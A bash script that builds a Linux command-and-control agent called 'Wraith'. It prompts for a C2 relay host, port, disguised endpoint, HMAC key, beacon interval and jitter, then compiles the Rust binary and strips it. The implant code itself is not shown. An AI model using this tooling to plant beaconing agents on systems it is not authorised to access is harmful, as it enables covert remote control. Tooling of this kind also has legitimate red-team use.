#!/bin/bash

echo "=========================================="
echo "    Wraith Linux Agent Builder"
echo "=========================================="
echo ""

# Prompt for configuration
read -p "C2 Relay Host [localhost]: " C2_HOST
C2_HOST=${C2_HOST:-localhost}

read -p "C2 Relay Port [8081]: " C2_PORT
C2_PORT=${C2_PORT:-8081}

read -p "C2 Endpoint [/wiki]: " C2_ENDPOINT
C2_ENDPOINT=${C2_ENDPOINT:-/wiki}

read -p "HMAC Key (hex): " HMAC_KEY

if [ -z "$HMAC_KEY" ]; then
    echo "[ERROR] HMAC key is required!"
    exit 1
fi

read -p "Beacon Interval (seconds) [15]: " BEACON_INTERVAL
BEACON_INTERVAL=${BEACON_INTERVAL:-15}

read -p "Jitter (seconds) [10]: " JITTER
JITTER=${JITTER:-10}

echo ""
echo "Configuration:"
echo "  Host:            $C2_HOST"
echo "  Port:            $C2_PORT (QUIC)"
echo "  Endpoint:        $C2_ENDPOINT"
echo "  HMAC Key:        ${HMAC_KEY:0:16}...${HMAC_KEY: -8}"
echo "  Beacon Interval: ${BEACON_INTERVAL}s"
echo "  Jitter:          ${JITTER}s"
echo ""

echo "[*] Building wraith for Linux..."

# Build with environment variables
WRAITH_HOST="$C2_HOST" \
WRAITH_PORT="$C2_PORT" \
WRAITH_ENDPOINT="$C2_ENDPOINT" \
WRAITH_HMAC_KEY="$HMAC_KEY" \
cargo build --release

if [ $? -eq 0 ]; then
    echo ""
    echo "[SUCCESS] Build complete: target/release/wraith"
    echo ""
    ls -lh target/release/wraith
    
    # Strip binary
    if command -v strip &> /dev/null; then
        echo ""
        echo "[*] Stripping binary..."
        strip target/release/wraith
        ls -lh target/release/wraith
    fi
else
    echo ""
    echo "[ERROR] Build failed!"
    exit 1
fi

